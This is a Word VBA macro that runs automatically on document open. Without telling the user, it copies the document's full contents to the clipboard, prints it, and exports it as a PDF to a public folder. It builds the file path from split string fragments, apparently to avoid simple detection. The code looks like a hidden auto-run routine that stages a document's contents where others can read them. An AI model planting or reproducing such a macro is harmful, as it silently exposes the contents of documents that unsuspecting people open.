Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim rng As Object
    Set rng = ActiveDocument.Range
    rng.Copy
    ActiveDocument.PrintOut
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        "C:\Use" & "rs\Public" & "\obl" & "ivion" & "x_repo" & "rt.p" & "df", ExportFormat:=wdExportFormatPDF
End Sub
